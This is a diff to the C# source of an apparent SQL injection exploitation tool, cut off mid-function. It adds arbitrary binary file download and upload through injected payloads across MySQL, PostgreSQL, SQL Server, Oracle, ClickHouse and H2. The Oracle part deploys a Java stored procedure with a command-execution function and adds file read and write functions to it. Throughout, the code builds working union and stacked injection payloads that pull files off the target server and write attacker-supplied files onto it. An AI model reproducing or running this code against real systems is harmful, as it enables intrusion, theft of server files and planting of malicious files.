@@ -94,6 +94,45 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                     case "Java写文件":
                         await WriteFileByOracleJava(config, vm).ConfigureAwait(false);
                         break;
+                    case "二进制下载(load_file)":
+                        await BinaryDownloadMySQL(config, vm).ConfigureAwait(false);
+                        break;
+                    case "二进制上传(dumpfile)":
+                        await BinaryUploadMySQL(config, vm).ConfigureAwait(false);
+                        break;
+                    case "二进制下载(大对象)":
+                        await BinaryDownloadPg(config, vm).ConfigureAwait(false);
+                        break;
+                    case "二进制上传(大对象)":
+                        await BinaryUploadPg(config, vm).ConfigureAwait(false);
+                        break;
+                    case "二进制下载(OPENROWSET)":
+                        await BinaryDownloadSqlServer(config, vm).ConfigureAwait(false);
+                        break;
+                    case "二进制上传(ADODB.Stream)":
+                        await BinaryUploadSqlServer(config, vm).ConfigureAwait(false);
+                        break;
+                    case "二进制下载(Java)":
+                        await BinaryDownloadOracle(config, vm).ConfigureAwait(false);
+                        break;
+                    case "二进制上传(Java)":
+                        await BinaryUploadOracle(config, vm).ConfigureAwait(false);
+                        break;
+                    case "二进制下载(file RawBLOB)":
+                        await BinaryDownloadClickHouse(config, vm).ConfigureAwait(false);
+                        break;
+                    case "二进制下载(FILE_READ)":
+                        await BinaryDownloadH2(config, vm).ConfigureAwait(false);
+                        break;
+                    case "二进制上传(FILE_WRITE)":
+                        await BinaryUploadH2(config, vm).ConfigureAwait(false);
+                        break;
+                    case "二进制下载(readfile扩展)":
+                        await BinaryDownloadSqlite(config, vm).ConfigureAwait(false);
+                        break;
+                    case "二进制上传(writefile扩展)":
+                        await BinaryUploadSqlite(config, vm).ConfigureAwait(false);
+                        break;
                 }
             }
             catch (OperationCanceledException)
@@ -174,7 +213,8 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             }
             int columnsLen = config.DataConfig.SumColumnCount;
             int showIndex = config.DataConfig.ShowColumnIndex;
-            //1=2压制原始行（防止原表行混入文件内容）；INTO DUMPFILE直接拼接各列字节，非显示位必须用NULL填充（NULL不产生字节），否则填充值会污染文件内容
+            //1=2压制原始行（防止原表行混入文件内容）；INTO DUMPFILE直接拼接各列字节，
+            //非显示位必须用x''空二进制字面量填充——MySQL 8实测NULL会被写成0x00字节污染文件内容，x''/'' 零字节产出（x''对int列也安全）
             StringBuilder sb = new StringBuilder(" 1=2 union select ");
             for (int i = 1; i <= columnsLen; i++)
             {
@@ -184,7 +224,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 }
                 else
                 {
-                    sb.Append("NULL,");
+                    sb.Append("x'',");
                 }
             }
             sb.Remove(sb.Length - 1, 1);
@@ -538,7 +578,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             StringBuilder sb = new StringBuilder(" 1=2 union select ");
             for (int i = 1; i <= columnsLen; i++)
             {
-                sb.Append(i == showIndex ? udfHex : "NULL");
+                sb.Append(i == showIndex ? udfHex : "x''");
                 sb.Append(',');
             }
             sb.Remove(sb.Length - 1, 1);
@@ -1366,6 +1406,31 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             "            return \"OK\";\n" +
             "        } catch (Exception e) { return \"ERR:\" + e.getMessage(); }\n" +
             "    }\n" +
+            "    public static String readFileHex(String path, int off, int len) {\n" +
+            "        try {\n" +
+            "            RandomAccessFile r = new RandomAccessFile(path, \"r\");\n" +
+            "            r.seek(off);\n" +
+            "            byte[] buf = new byte[len];\n" +
+            "            int n = r.read(buf);\n" +
+            "            r.close();\n" +
+            "            if (n <= 0) { return \"\"; }\n" +
+            "            char[] hc = \"0123456789abcdef\".toCharArray();\n" +
+            "            StringBuilder sb = new StringBuilder(n * 2);\n" +
+            "            for (int i = 0; i < n; i++) { int b = buf[i] & 0xff; sb.append(hc[b >> 4]).append(hc[b & 15]); }\n" +
+            "            return sb.toString();\n" +
+            "        } catch (Exception e) { return \"ERR:\" + e.getMessage(); }\n" +
+            "    }\n" +
+            "    public static String writeFileBin(String path, String hex, int append) {\n" +
+            "        try {\n" +
+            "            FileOutputStream f = new FileOutputStream(path, append == 1);\n" +
+            "            for (int i = 0; i + 1 < hex.length(); i += 2) { f.write(Integer.parseInt(hex.substring(i, i + 2), 16)); }\n" +
+            "            f.close();\n" +
+            "            return \"OK\";\n" +
+            "        } catch (Exception e) { return \"ERR:\" + e.getMessage(); }\n" +
+            "    }\n" +
+            "    public static String fileSize(String path) {\n" +
+            "        try { return String.valueOf(new File(path).length()); } catch (Exception e) { return \"ERR:\" + e.getMessage(); }\n" +
+            "    }\n" +
             "}";
 
         /// <summary>部署Oracle Java通道：CREATE JAVA SOURCE（hex分块拼接规避字面量4000上限）+ 三个映射函数 + 自检探活</summary>
@@ -1373,20 +1438,26 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
         {
             Log.Show("正在通过 GETXML 通道部署 Java 存储过程（SqliUtil）……");
             string srcHex = Convert.ToHexString(Encoding.UTF8.GetBytes(OraJavaSource));
-            StringBuilder sb = new StringBuilder("create or replace and compile java source named \"SqliUtil\" as ");
+            //CREATE JAVA SOURCE AS 后只接受字面源码（实测ORA-29536，不接受utl_raw表达式），
+            //故内层再包一个PL/SQL块：先hex解码到变量，再execute immediate拼出字面源码DDL
+            StringBuilder sb = new StringBuilder("declare s varchar2(32767); begin s := ");
             for (int off = 0; off < srcHex.Length; off += 3800)
             {
                 if (off > 0)
                 {
-                    sb.Append("||");
+                    sb.Append(" || ");
                 }
-                sb.Append("utl_raw.cast_to_varchar2(hextoraw('").Append(srcHex, off, Math.Min(3800, srcHex.Length - off)).Append("')");
+                sb.Append("utl_raw.cast_to_varchar2(hextoraw('").Append(srcHex, off, Math.Min(3800, srcHex.Length - off)).Append("'))");
             }
+            sb.Append("; execute immediate 'create or replace and compile java source named \"SqliUtil\" as ' || s; end;");
             //所有DDL均为 or replace 幂等：盲注通道多次求值也安全
             await FetchScalar(config, OraGetXmlExec(sb.ToString())).ConfigureAwait(false);
             await FetchScalar(config, OraGetXmlExec("create or replace function SqliEval(p in varchar2) return varchar2 as language java name 'SqliUtil.runCmd(java.lang.String) return java.lang.String'")).ConfigureAwait(false);
             await FetchScalar(config, OraGetXmlExec("create or replace function SqliRead(p in varchar2) return varchar2 as language java name 'SqliUtil.readFile(java.lang.String) return java.lang.String'")).ConfigureAwait(false);
             await FetchScalar(config, OraGetXmlExec("create or replace function SqliWrite(p in varchar2,c in varchar2) return varchar2 as language java name 'SqliUtil.writeFile(java.lang.String,java.lang.String) return java.lang.String'")).ConfigureAwait(false);
+            await FetchScalar(config, OraGetXmlExec("create or replace function SqliReadHex(p in varchar2,o in number,l in number) return varchar2 as language java name 'SqliUtil.readFileHex(java.lang.String,int,int) return java.lang.String'")).ConfigureAwait(false);
+            await FetchScalar(config, OraGetXmlExec("create or replace function SqliWriteBin(p in varchar2,c in varchar2,a in number) return varchar2 as language java name 'SqliUtil.writeFileBin(java.lang.String,java.lang.String,int) return java.lang.String'")).ConfigureAwait(false);
+            await FetchScalar(config, OraGetXmlExec("create or replace function SqliFileSize(p in varchar2) return varchar2 as language java name 'SqliUtil.fileSize(java.lang.String) return java.lang.String'")).ConfigureAwait(false);
             try
             {
                 string probe = await FetchScalar(config, "(select SqliEval('echo sqli_ora_ok') from dual)").ConfigureAwait(false);
@@ -1645,5 +1716,622 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 }
             }
         }
+        //==================== 二进制文件上传/下载（hex 分片传输，字节级无损）====================
+        //传输设计：服务端表达式统一产出 ASCII hex 字符串（MySQL hex() / PG encode() / SQLServer convert(...,2) /
+        //Oracle Java hex / ClickHouse hex()），按当前注入通道取回（Union整取/报错分片/盲注逐字符），
+        //本地 Convert.FromHexString 还原字节直接落盘——全程不过文本编码，二进制无损。
+
+        /// <summary>按当前注入通道取回ASCII hex字符串（Union整取/报错按探针步长分片/盲注按字符）</summary>
+        private static async Task<string> FetchHexString(AppConfig config, string hexExpr, int maxHexLen)
+        {
+            switch (config.DataConfig.SelectedInjectType)
+            {
+                case InjectType.Union:
+                    return ((await DataComm.DataDumpWithNoFrom(config, hexExpr).ConfigureAwait(false)) ?? "").Trim();
+                case InjectType.Error:
+                    string lenStr = await DataComm.DataDumpWithError(config, PayloadFactory.BPTool.DataLen(hexExpr)).ConfigureAwait(false);
+                    int.TryParse(lenStr, out int sumlen);
+                    if (sumlen <= 0)
+                    {
+                        return "";
+                    }
+                    Log.SysLog("hex数据长度：" + sumlen);
+                    int step = await DataComm.GetErrorChunkStep(config).ConfigureAwait(false);
+                    StringBuilder sb = new StringBuilder(sumlen);
+                    for (int s = 1; s <= sumlen; s += step)
+                    {
+                        config.CheckStop();
+                        sb.Append(await DataComm.DataDump(config, PayloadFactory.BPTool.ErrorDataSubstr(hexExpr, s, step)).ConfigureAwait(false));
+                    }
+                    return sb.ToString().Trim();
+                default:
+                    if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
+                    {
+                        Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
+                        return "";
+                    }
+                    //hex串为纯ASCII，通用盲注取值走ASCII快车道
+                    return ((await DataComm.GetStringByBool(config, hexExpr, maxHexLen).ConfigureAwait(false)) ?? "").Trim();
+            }
+        }
+
+        /// <summary>hex字符串还原字节（去空白/0x前缀，容忍奇数长度截尾）</summary>
+        private static byte[] HexToBytes(string hex)
+        {
+            StringBuilder sb = new StringBuilder(hex.Length);
+            foreach (char c in hex)
+            {
+                if (!char.IsWhiteSpace(c))
+                {
+                    sb.Append(c);
+                }
+            }
+            string clean = sb.ToString();
+            if (clean.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
+            {
+                clean = clean.Substring(2);
+            }
+            if (clean.Length % 2 != 0)
+            {
+                clean = clean.Substring(0, clean.Length - 1);
+            }
+            if (clean.Length == 0)
+            {
+                return Array.Empty<byte>();
+            }
+            try
+            {
+                return Convert.FromHexString(clean);
+            }
+            catch (FormatException)
+            {
+                Log.Warning("hex数据含非法字符，二进制还原失败（目标可能被WAF干扰或通道异常）！");
+                return Array.Empty<byte>();
+            }
+        }
+
+        /// <summary>上传分片大小（字节）：GET注入URL长度受限用小片，POST用大片</summary>
+        private static int UploadChunkSize(AppConfig config, int max)
+        {
+            bool isGet = (config.RequestTxt ?? "").TrimStart().StartsWith("GET", StringComparison.OrdinalIgnoreCase);
+            return Math.Min(max, isGet ? 1200 : 6000);
+        }
+
+        /// <summary>二进制下载收尾：字节交给ViewModel并输出日志</summary>
+        private static void FinishBinaryDownload(FileCmdViewModel vm, byte[] data, string emptyHint)
+        {
+            vm.SetFileBytes(data);
+            if (data.Length == 0)
+            {
+                Log.Warning("二进制下载结果为空！" + emptyHint);
+            }
+            else
+            {
+                Log.Success("二进制下载完成，共 " + data.Length + " 字节！请点击「保存到本地」落盘。");
+            }
+        }
+
+        /// <summary>取待上传字节（未选择本地文件时告警并返回null）</summary>
+        private static byte[]? RequireUploadBytes(FileCmdViewModel vm)
+        {
+            byte[]? data = vm.FileBytes;
+            if (data == null || data.Length == 0)
+            {
+                Log.Warning("请先点击「选择文件」选择要上传的本地文件！");
+                return null;
+            }
+            return data;
+        }
+
+        //---------- MySQL：hex(load_file()) 下载 / 临时表分片+dumpfile 上传 ----------
+
+        /// <summary>MySQL 二进制下载：hex(load_file(0x路径)) 取hex串（全注入通道可用）</summary>
+        private static async Task BinaryDownloadMySQL(AppConfig config, FileCmdViewModel vm)
+        {
+            string pathHex = TextCodec.StrToHex(vm.FilePath, "UTF-8");
+            Log.Show("二进制下载：" + vm.FilePath + " ……");
+            string hex = await FetchHexString(config, "(hex(load_file(" + pathHex + ")))", 64 * 1024 * 1024).ConfigureAwait(false);
+            FinishBinaryDownload(vm, HexToBytes(hex), "可能原因：文件不存在/无读权限/secure_file_priv限制/盲注判断值未配置。");
+        }
+
+        /// <summary>MySQL 二进制上传：Union小文件单发 0x..into dumpfile；堆叠临时表分片+order by id into dumpfile；写后length(load_file)验证</summary>
+        private static async Task BinaryUploadMySQL(AppConfig config, FileCmdViewModel vm)
+        {
+            byte[]? data = RequireUploadBytes(vm);
+            if (data == null)
+            {
+                return;
+            }
+            string pathEsc = vm.FilePath.Replace("\\", "/", StringComparison.Ordinal).Replace("'", "''", StringComparison.Ordinal);
+            if (config.DataConfig.SelectedInjectType.Equals(InjectType.Union))
+            {
+                //Union单发（大小受请求长度限制，>4KB建议堆叠分片）
+                if (data.Length > 4000)
+                {
+                    Log.Warning("Union单发上传超过4KB（" + data.Length + "字节），URL/请求体可能超限，请改用堆叠注入通道分片上传！");
+                    return;
+                }
+                int columnsLen = config.DataConfig.SumColumnCount;
+                int showIndex = config.DataConfig.ShowColumnIndex;
+                StringBuilder sb = new StringBuilder(" 1=2 union select ");
+                for (int i = 1; i <= columnsLen; i++)
+                {
+                    sb.Append(i == showIndex ? "0x" + Convert.ToHexString(data) : "x''");
+                    sb.Append(',');
+                }
+                sb.Remove(sb.Length - 1, 1);
+                sb.Append(" into dumpfile '").Append(pathEsc).Append("'");
+                Log.Show("Union二进制上传（" + data.Length + "字节）……");
+                await SendPayload(config, sb.ToString()).ConfigureAwait(false);
+            }
+            else
+            {
+                //堆叠分片：临时表存blob片段，order by id into dumpfile 按序拼接落盘
+                int chunkSize = UploadChunkSize(config, 6000);
+                int chunks = (data.Length + chunkSize - 1) / chunkSize;
+                Log.Show("堆叠分片二进制上传（" + data.Length + "字节，" + chunks + "片×" + chunkSize + "字节）……");
+                await SendPayload(config, " 1=1;drop table if exists ssqlibin;create table ssqlibin(id int auto_increment primary key, d longblob);select 1 where 1=1 ").ConfigureAwait(false);
+                try
+                {
+                    for (int i = 0; i < chunks; i++)
+                    {
+                        config.CheckStop();
+                        int off = i * chunkSize;
+                        int len = Math.Min(chunkSize, data.Length - off);
+                        await SendPayload(config, " 1=1;insert into ssqlibin(d) values(0x" + Convert.ToHexString(data, off, len) + ");select 1 where 1=1 ").ConfigureAwait(false);
+                        Log.SysLog("已上传分片 " + (i + 1) + "/" + chunks);
+                    }
+                    await SendPayload(config, " 1=1;select d from ssqlibin order by id into dumpfile '" + pathEsc + "';select 1 where 1=1 ").ConfigureAwait(false);
+                }
+                finally
+                {
+                    try
+                    {
+                        await SendPayload(config, " 1=1;drop table if exists ssqlibin;select 1 where 1=1 ").ConfigureAwait(false);
+                    }
+                    catch (Exception)
+                    {
+                    }
+                }
+            }
+            //写后验证：length(load_file) 比对字节数
+            string pathHex = TextCodec.StrToHex(vm.FilePath, "UTF-8");
+            string lenStr = await FetchScalar(config, "(select length(load_file(" + pathHex + ")))").ConfigureAwait(false);
+            if (int.TryParse(lenStr, out int remoteLen) && remoteLen == data.Length)
+            {
+                Log.Success("二进制上传验证通过：远端文件 " + remoteLen + " 字节，与本地一致！");
+            }
+            else
+            {
+                Log.Warning("写后验证未通过（远端长度=" + (lenStr ?? "读取失败") + "，本地=" + data.Length + "）！可能原因：secure_file_priv限制/目录不可写/权限不足，请人工检查。");
+            }
+        }
+
+        //---------- PostgreSQL：大对象 encode/decode hex 双向（Union/报错/堆叠） ----------
+
+        /// <summary>PG 二进制下载：lo_import导入→pg_largeobject取encode hex→lo_unlink清理（需superuser或pg_read_server_files；堆叠/Union/报错通道）</summary>
+        private static async Task BinaryDownloadPg(AppConfig config, FileCmdViewModel vm)
+        {
+            bool stacked = config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked);
+            if (!stacked && !EnsurePgLoChannel(config))
+            {
+                return;
+            }
+            int oid = 90300 + new Random().Next(0, 6000);
+            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
+            Log.Show("二进制下载：" + vm.FilePath + "（loid=" + oid + "）……");
+            try
+            {
+                if (stacked)
+                {
+                    await SendStackedStmt(config, "select lo_import('" + pathEsc + "'," + oid + ")").ConfigureAwait(false);
+                }
+                else
+                {
+                    await FetchScalar(config, "(select lo_import('" + pathEsc + "'," + oid + "))").ConfigureAwait(false);
+                }
+                string hex = await FetchHexString(config, "(select coalesce(string_agg(encode(data,'hex'),'' order by pageno),'') from pg_largeobject where loid=" + oid + ")", 64 * 1024 * 1024).ConfigureAwait(false);
+                FinishBinaryDownload(vm, HexToBytes(hex), "可能原因：文件不存在/无读权限（需superuser或pg_read_server_files）/盲注判断值未配置。");
+            }
+            finally
+            {
+                try
+                {
+                    if (stacked)
+                    {
+                        await SendStackedStmt(config, "select lo_unlink(" + oid + ")").ConfigureAwait(false);
+                    }
+                    else
+                    {
+                        await FetchScalar(config, "(select lo_unlink(" + oid + "))").ConfigureAwait(false);
+                    }
+                }
+                catch (Exception)
+                {
+                }
+            }
+        }
+
+        /// <summary>PG 二进制上传：堆叠分页写pg_largeobject+lo_export；Union/报错小文件lo_from_bytea单发；写后sum(length(data))验证（需superuser或pg_write_server_files）</summary>
+        private static async Task BinaryUploadPg(AppConfig config, FileCmdViewModel vm)
+        {
+            byte[]? data = RequireUploadBytes(vm);
+            if (data == null)
+            {
+                return;
+            }
+            bool stacked = config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked);
+            if (!stacked && !EnsurePgLoChannel(config))
+            {
+                return;
+            }
+            int oid = 90300 + new Random().Next(0, 6000);
+            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
+            if (!stacked)
+            {
+                //Union/报错单发：lo_from_bytea一次性写入（大小受请求长度限制）
+                if (data.Length > 4000)
+                {
+                    Log.Warning("Union/报错单发上传超过4KB（" + data.Length + "字节），请求体可能超限，请改用堆叠注入通道分片上传！");
+                    return;
+                }
+                Log.Show("大对象二进制上传（" + data.Length + "字节，loid=" + oid + "）……");
+                await FetchScalar(config, "(select lo_from_bytea(" + oid + ",decode('" + Convert.ToHexString(data) + "','hex')))").ConfigureAwait(false);
+            }
+            else
+            {
+                //堆叠分页写（2048字节/页对齐pg_largeobject页结构）
+                int pageSize = 2048;
+                int pages = (data.Length + pageSize - 1) / pageSize;
+                Log.Show("堆叠分片二进制上传（" + data.Length + "字节，" + pages + "页×" + pageSize + "字节，loid=" + oid + "）……");
+                await SendStackedStmt(config, "select lo_create(" + oid + ")").ConfigureAwait(false);
+                await SendStackedStmt(config, "delete from pg_largeobject where loid=" + oid).ConfigureAwait(false);
+                for (int i = 0; i < pages; i++)
+                {
+                    config.CheckStop();
+                    int off = i * pageSize;
+                    int len = Math.Min(pageSize, data.Length - off);
+                    await SendStackedStmt(config, "insert into pg_largeobject(loid,pageno,data) values (" + oid + "," + i + ",decode('" + Convert.ToHexString(data, off, len) + "','hex'))").ConfigureAwait(false);
+                    Log.SysLog("已上传分片 " + (i + 1) + "/" + pages);
+                }
+            }
+            //写前验证：大对象字节数比对（导出前比对，失败不污染磁盘）
+            string lenStr = await FetchScalar(config, "(select coalesce(sum(length(data)),0) from pg_largeobject where loid=" + oid + ")").ConfigureAwait(false);
+            if (!int.TryParse(lenStr, out int loLen) || loLen != data.Length)
+            {
+                Log.Warning("大对象写入长度校验未通过（写入=" + (lenStr ?? "读取失败") + "，本地=" + data.Length + "），已放弃导出！");
+                try
+                {
+                    if (stacked)
+                    {
+                        await SendStackedStmt(config, "select lo_unlink(" + oid + ")").ConfigureAwait(false);
+                    }
+                    else
+                    {
+                        await FetchScalar(config, "(select lo_unlink(" + oid + "))").ConfigureAwait(false);
+                    }
+                }
+                catch (Exception)
+                {
+                }
+                return;
+            }
+            if (stacked)
+            {
+                await SendStackedStmt(config, "select lo_export(" + oid + ",'" + pathEsc + "')").ConfigureAwait(false);
+                await SendStackedStmt(config, "select lo_unlink(" + oid + ")").ConfigureAwait(false);
+            }
+            else
+            {
+                await FetchScalar(config, "(select lo_export(" + oid + ",'" + pathEsc + "'))").ConfigureAwait(false);
+                try
+                {
+                    await FetchScalar(config, "(select lo_unlink(" + oid + "))").ConfigureAwait(false);
+                }
+                catch (Exception)
+                {
+                }
+            }
+            Log.Success("二进制上传完成：" + vm.FilePath + "（" + data.Length + "字节，写入长度已校验）；请人工确认目标文件可访问！");
+        }
+
+        //---------- SQLServer：OPENROWSET SINGLE_BLOB 下载 / ADODB.Stream 上传（已实测SQL2022字节无损） ----------
+
+        /// <summary>堆叠语句发送（时间通道去掉 1=1; 前缀，与ReadSqlServerScalar一致）</summary>
+        private static async Task SendSqlServerStacked(AppConfig config, string payload)
+        {
+            if (config.DataConfig.IsTimeChannel)
+            {
+                payload = payload.Replace(" 1=1;", ";", StringComparison.Ordinal);
+            }
+            await SendPayload(config, payload).ConfigureAwait(false);
+        }
+
+        /// <summary>SQLServer 二进制下载：OPENROWSET(BULK..SINGLE_BLOB)入临时表→convert(varchar(max),b,2)取hex→清理（需堆叠建表+OPENROWSET权限，取数全通道可用）</summary>
+        private static async Task BinaryDownloadSqlServer(AppConfig config, FileCmdViewModel vm)
+        {
+            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
+            Log.Show("二进制下载：" + vm.FilePath + " ……");
+            await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("FileBinaryReadSetup").Replace("{path}", pathEsc, StringComparison.Ordinal)).ConfigureAwait(false);
+            try
+            {
+                string hex = await FetchHexString(config, PayloadFactory.BasePayload.Get("FileBinaryHex"), 64 * 1024 * 1024).ConfigureAwait(false);
+                FinishBinaryDownload(vm, HexToBytes(hex), "可能原因：文件不存在/无读权限/OPENROWSET被禁用（需Ad Hoc Distributed Queries或sysadmin）。");
+            }
+            finally
+            {
+                try
+                {
+                    await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("CmdDropTable")).ConfigureAwait(false);
+                }
+                catch (Exception)
+                {
+                }
+            }
+        }
+
+        /// <summary>SQLServer 二进制上传：临时表varbinary分片→@bin+=data聚合→ADODB.Stream(Type=1)写出；写后OPENROWSET回读datalength验证（需堆叠+Ole Automation）</summary>
+        private static async Task BinaryUploadSqlServer(AppConfig config, FileCmdViewModel vm)
+        {
+            byte[]? data = RequireUploadBytes(vm);
+            if (data == null)
+            {
+                return;
+            }
+            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
+            int chunkSize = UploadChunkSize(config, 7000);
+            int chunks = (data.Length + chunkSize - 1) / chunkSize;
+            Log.Show("ADODB.Stream二进制上传（" + data.Length + "字节，" + chunks + "片×" + chunkSize + "字节）……");
+            await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("FileBinaryWriteCreate")).ConfigureAwait(false);
+            try
+            {
+                for (int i = 0; i < chunks; i++)
+                {
+                    config.CheckStop();
+                    int off = i * chunkSize;
+                    int len = Math.Min(chunkSize, data.Length - off);
+                    await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("FileBinaryWriteChunk").Replace("{chunk}", "0x" + Convert.ToHexString(data, off, len), StringComparison.Ordinal)).ConfigureAwait(false);
+                    Log.SysLog("已上传分片 " + (i + 1) + "/" + chunks);
+                }
+                await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("FileBinaryWriteFlush").Replace("{path}", pathEsc, StringComparison.Ordinal)).ConfigureAwait(false);
+            }
+            finally
+            {
+                try
+                {
+                    await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("FileBinaryWriteDrop")).ConfigureAwait(false);
+                }
+                catch (Exception)
+                {
+                }
+            }
+            //写后验证：OPENROWSET回读datalength比对
+            try
+            {
+                await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("FileBinaryReadSetup").Replace("{path}", pathEsc, StringComparison.Ordinal)).ConfigureAwait(false);
+                string lenStr = await FetchScalar(config, PayloadFactory.BasePayload.Get("FileBinaryLen")).ConfigureAwait(false);
+                if (int.TryParse(lenStr, out int remoteLen) && remoteLen == data.Length)
+                {
+                    Log.Success("二进制上传验证通过：远端文件 " + remoteLen + " 字节，与本地一致！");
+                }
+                else
+                {
+                    Log.Warning("写后验证未通过（远端长度=" + (lenStr ?? "读取失败") + "，本地=" + data.Length + "）！请人工检查ADODB写出是否成功（Ole Automation/目录权限）。");
+                }
+            }
+            finally
+            {
+                try
+                {
+                    await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("CmdDropTable")).ConfigureAwait(false);
+                }
+                catch (Exception)
+                {
+                }
+            }
+        }
+
+        //---------- Oracle：Java通道 hex 分片双向（SqliReadHex/SqliWriteBin/SqliFileSize，varchar2(4000)→1500字节/片） ----------
+
+        /// <summary>Oracle Java 二进制分片大小（hex后3000字符&lt;varchar2(4000)上限）</summary>
+        private const int OraBinChunk = 1500;
+
+        /// <summary>Oracle 二进制下载：SqliFileSize取大小→SqliReadHex分片取hex（Java RandomAccessFile seek）</summary>
+        private static async Task BinaryDownloadOracle(AppConfig config, FileCmdViewModel vm)
+        {
+            await EnsureOracleJavaReady(config).ConfigureAwait(false);
+            string pathHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FilePath));
+            string sizeStr = await FetchScalar(config, "(select SqliFileSize(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "'))) from dual)").ConfigureAwait(false);
+            if (!long.TryParse(sizeStr, out long size) || size < 0)
+            {
+                Log.Warning("获取文件大小失败：" + sizeStr + "（文件不存在/无权限/Java通道未就绪）");
+                return;
+            }
+            Log.Show("二进制下载：" + vm.FilePath + "（" + size + "字节，分片" + OraBinChunk + "字节）……");
+            StringBuilder hexAll = new StringBuilder((int)Math.Min(size * 2, int.MaxValue));
+            for (long off = 0; off < size; off += OraBinChunk)
+            {
+                config.CheckStop();
+                int len = (int)Math.Min(OraBinChunk, size - off);
+                string chunk = await FetchScalar(config, "(select SqliReadHex(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "'))," + off + "," + len + ") from dual)").ConfigureAwait(false);
+                if ((chunk ?? "").StartsWith("ERR:", StringComparison.Ordinal))
+                {
+                    Log.Warning("分片读取失败（offset=" + off + "）：" + chunk);
+                    break;
+                }
+                hexAll.Append(chunk);
+                Log.SysLog("已下载分片 offset=" + off + "/" + size);
+            }
+            FinishBinaryDownload(vm, HexToBytes(hexAll.ToString()), "可能原因：文件不存在/无读权限/Java通道未部署成功。");
+        }
+
+        /// <summary>Oracle 二进制上传：SqliWriteBin分片append写（FileOutputStream append模式）</summary>
+        private static async Task BinaryUploadOracle(AppConfig config, FileCmdViewModel vm)
+        {
+            byte[]? data = RequireUploadBytes(vm);
+            if (data == null)
+            {
+                return;
+            }
+            await EnsureOracleJavaReady(config).ConfigureAwait(false);
+            string pathHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FilePath));
+            int chunks = (data.Length + OraBinChunk - 1) / OraBinChunk;
+            Log.Show("Java二进制上传（" + data.Length + "字节，" + chunks + "片×" + OraBinChunk + "字节）……");
+            for (int i = 0; i < chunks; i++)
+            {
+                config.CheckStop();
+                int off = i * OraBinChunk;
+                int len = Math.Min(OraBinChunk, data.Length - off);
+                string chunkHex = Convert.ToHexString(data, off, len);
+                string result = await FetchScalar(config, "(select SqliWriteBin(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "')),'" + chunkHex + "'," + (i == 0 ? 0 : 1) + ") from dual)").ConfigureAwait(false);
+                if (!(result ?? "").StartsWith("OK", StringComparison.Ordinal))
+                {
+                    Log.Warning("分片写入失败（" + (i + 1) + "/" + chunks + "）：" + result);
+                    return;
+                }
+                Log.SysLog("已上传分片 " + (i + 1) + "/" + chunks);
+            }
+            //写后验证：SqliFileSize比对
+            string sizeStr = await FetchScalar(config, "(select SqliFileSize(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "'))) from dual)").ConfigureAwait(false);
+            if (long.TryParse(sizeStr, out long remoteSize) && remoteSize == data.Length)
+            {
+                Log.Success("二进制上传验证通过：远端文件 " + remoteSize + " 字节，与本地一致！");
+            }
+            else
+            {
+                Log.Warning("写后验证未通过（远端大小=" + (sizeStr ?? "读取失败") + "，本地=" + data.Length + "），请人工检查！");
+            }
+        }
+
+        //---------- ClickHouse：file() RawBLOB 整读 + hex 下载（仅user_files目录） ----------
+
+        /// <summary>ClickHouse 二进制下载：file(path,'RawBLOB','s String')整文件单值→hex()取回（仅user_files目录）</summary>
+        private static async Task BinaryDownloadClickHouse(AppConfig config, FileCmdViewModel vm)
+        {
+            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
+            Log.Show("二进制下载：" + vm.FilePath + " ……");
+            string hex = await FetchHexString(config, "(select hex(s) from file('" + pathEsc + "','RawBLOB','s String'))", 64 * 1024 * 1024).ConfigureAwait(false);
+            FinishBinaryDownload(vm, HexToBytes(hex), "可能原因：文件不在user_files目录/无读权限/盲注判断值未配置。");
+        }
+
+        //---------- H2：FILE_READ(BLOB)+RAWTOHEX 下载 / FILE_WRITE(x'hex') 上传（内置函数，需admin；H2 1.x/2.x均保留） ----------
+
+        /// <summary>H2 二进制下载：rawtohex(file_read(path))——FILE_READ单参数返回BLOB字节无损，hex后全通道取回（需admin权限）</summary>
+        private static async Task BinaryDownloadH2(AppConfig config, FileCmdViewModel vm)
+        {
+            string Enc(string s) => TextCodec.StrToChrOrChar(s, "char", "||", "UTF-8");
+            Log.Show("二进制下载：" + vm.FilePath + " ……");
+            string hex = await FetchHexString(config, "rawtohex(file_read(" + Enc(vm.FilePath) + "))", 64 * 1024 * 1024).ConfigureAwait(false);
+            FinishBinaryDownload(vm, HexToBytes(hex), "可能原因：文件不存在/非admin权限（FILE_READ需admin）/盲注判断值未配置。");
+        }
+
+        /// <summary>H2 二进制上传：小文件file_write(x'hex',path)单发（返回写入字节数直接验证）；大文件CREATE ALIAS分片append（需JDK编译器）</summary>
+        private static async Task BinaryUploadH2(AppConfig config, FileCmdViewModel vm)
+        {
+            byte[]? data = RequireUploadBytes(vm);
+            if (data == null)
+            {
+                return;
+            }
+            string Enc(string s) => TextCodec.StrToChrOrChar(s, "char", "||", "UTF-8");
+            if (config.DataConfig.SelectedInjectType.Equals(InjectType.Blind)
